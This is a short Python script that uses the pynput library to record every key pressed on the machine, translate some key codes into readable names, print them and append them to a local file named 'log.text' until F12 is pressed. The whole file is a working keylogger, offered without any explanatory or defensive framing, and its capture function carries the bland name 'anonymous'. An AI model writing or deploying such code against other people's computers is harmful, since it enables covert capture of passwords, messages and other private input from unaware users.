
from pynput.keyboard import Listener

def anonymous(key):
		key = str(key)
		key = key.replace("'"," ")
		if key == "Key.f12":
			raise SystemExit(0)
		if key == "<96>":
			key="0"
		if key == "<97>":
			key="1"
		if key == "<98>":
			key="2"
		if key == "<99>":
			key="3"
		if key == "<100>":
			key="4"
		if key == "<101>":
			key="5"
		if key == "<102>":
			key="6"
		if key == "<103>":
			key="7"
		if key == "<104>":
			key="8"
		if key == "<105>":
			key="9"
		if key == "<110>":
			key="."
		if key == "Key.enter":
			key="enter"
		if key == "Key.shift_r":
			key=""
		if key == "Key.alt_l":
			key=""
		if key == "Key.tab":
			key="new-tab"
		if key == "Key.backspace":
			key="delete"
		if key == "Key.space":
			key="space"
		if key == "Key.caps_lock":
			key="caps_lock"
		if key == "Key.ctrl_l":
			key="ctrl"
		if key == "Key.shift":
			key="shift"
			
		with open("log.text", "a") as file:
			file.write(key)
		print(key)

with Listener(on_press=anonymous) as listener:
		listener.join()